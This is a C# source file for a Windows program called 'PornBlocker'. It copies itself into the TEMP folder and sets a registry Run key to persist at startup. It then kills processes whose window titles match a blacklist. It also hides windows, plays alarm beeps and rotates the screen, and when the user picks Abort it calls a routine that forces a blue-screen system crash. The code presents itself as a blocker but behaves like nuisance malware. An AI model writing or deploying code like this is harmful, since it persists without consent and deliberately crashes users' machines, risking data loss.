using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace PornBlocker
{
    class Program
    {

        // Import dll's
        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);


        static void Main(string[] args)
        {

            // File location
            string installFile = System.Reflection.Assembly.GetEntryAssembly().Location;
            string installPath = Path.GetTempPath() + "\\" + Path.GetFileName(installFile);

            // If file not installed to system
            if (!File.Exists(installPath))
            {
                // Copy file to TEMP folder
                Console.WriteLine("Copying to system..");
                File.Copy(installFile, installPath);
                // Add file to autorun
                Console.WriteLine("Adding to autorun..");
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                registryKey.SetValue(Path.GetFileName(installFile).Split('.')[0], installPath);
            }

            Console.WriteLine("Scanning process list..");
            while (true)
            {
                // Sleep 500 ms
                Thread.Sleep(1500);
                // Get process list
                Process[] processlist = Process.GetProcesses();
                // For process window titles
                foreach (Process process in processlist)
                {
                    // Get process info
                    int processID = process.Id;
                    string windowTitle = process.MainWindowTitle;
                    string processName = process.ProcessName;
                    // If process have windowTitle
                    if (!String.IsNullOrEmpty(windowTitle))
                    {
                        // Check window title for blacklisted words
                        foreach (string word in Config.blacklist)
                        {
                            // If window title contains blacklisted word
                            if (windowTitle.ToUpper().Contains(word.ToUpper()))
                            {
                                // Stop process
                                try { 
                                    Process blacklistedProgram = Process.GetProcessById(processID);
                                    blacklistedProgram.Kill();
                                } catch { }
                               

                                // Random
                                Random random = new Random();
                                // MsgBox settings
                                string msgBoxText  = Config.messageText[random.Next(Config.messageText.Length)];
                                string msgBoxTitle = Config.messageTitle[random.Next(Config.messageTitle.Length)];
                                // Hide all windows
                                IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
                                SendMessage(lHwnd, 0x111, (IntPtr)419, IntPtr.Zero);
                                while (true)
                                {
                                    // Beep
                                    for (int i = 0; i < 3; i++)
                                        Console.Beep(1100, 150);

                                    // Show message box 
                                    DialogResult result = MessageBox.Show(
                                       String.Format(msgBoxText, word),
                                       msgBoxTitle,
                                       MessageBoxButtons.AbortRetryIgnore,
                                       MessageBoxIcon.Warning);

                                    if (result == DialogResult.Abort)
                                    {
                                        // Make beep sounds like a bomb
                                        for (int i = 0; i < 12; i++)
                                            Console.Beep(1300, 570);
                                        for (int i = 0; i < 9; i++)
                                            Console.Beep(2100, 370);
                                        for (int i = 0; i < 7; i++)
                                            Console.Beep(1900, 270);
                                        for (int i = 0; i < 5; i++)
                                            Console.Beep(2900, 170);
                                        // Call BSoD
                                        BSoD.bsod();
                                        break;
                                    }
                                    else if (result == DialogResult.Retry)
                                    {
                                        continue;
                                    } else
                                    {
                                        // Sleep 9 secounds
                                        Thread.Sleep(9000);
                                        // Rotate screen
                                        Display.Rotate(1, Display.Orientations.DEGREES_CW_90);
                                        Thread.Sleep(1300);
                                        Display.Rotate(1, Display.Orientations.DEGREES_CW_180);
                                        Thread.Sleep(1500);
                                        Display.Rotate(1, Display.Orientations.DEGREES_CW_270);
                                        Thread.Sleep(1200);
                                        // Sleep 9 secounds
                                        Thread.Sleep(9000);
                                        Display.Rotate(1, Display.Orientations.DEGREES_CW_0);
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
